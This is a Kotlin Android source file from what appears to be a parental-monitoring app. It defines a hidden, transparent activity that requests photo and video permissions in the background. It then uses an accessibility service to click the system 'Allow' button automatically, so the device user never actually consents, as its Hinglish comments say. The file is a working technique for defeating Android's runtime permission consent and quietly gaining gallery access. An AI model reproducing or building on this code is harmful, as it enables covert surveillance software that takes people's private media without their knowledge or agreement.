package com.familyguard.child.ui

import android.Manifest
import android.os.Bundle
import android.os.SystemClock
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import com.familyguard.child.data.Store

/**
 * Gallery permission ko BACKGROUND me maangne ke liye transparent activity —
 * ConsentActivity ke jaisa pattern (app ke paas overlay permission hai isliye
 * background se activity start legal hai). Runtime dialog aate hi
 * EnforcementService armed "gallery" step par system "Allow" button khud click
 * karta hai — bachche ko kuch nahi karna padta.
 */
class GalleryPermActivity : ComponentActivity() {

    private val permLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            // Result kya bhi ho — dialog ka kaam khatam. A11y ne Allow click kiya
            // hoga to permission mil chuki hogi; parent "Gallery" dobara tap
            // karega to list turant aayegi.
            finish()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!Store.paired || Store.released) {
            finish()
            return
        }
        val perms = if (android.os.Build.VERSION.SDK_INT >= 33)
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
        else
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        // A11y auto-allow arm karo (wizard "gallery" step) — dialog dikhTE hi
        // EnforcementService "Allow" click karega. AUTO-GRANT GUARD: 15 s ke
        // andar doosra request in-flight hai to extra arm ki zaroorat nahi.
        Store.autoClickStep = "gallery"
        Store.autoClickUntil = SystemClock.elapsedRealtime() + 30_000L
        runCatching {
            com.familyguard.child.service.EnforcementService.armGalleryAllow()
        }
        runCatching { permLauncher.launch(perms) }.onFailure { finish() }
    }
}
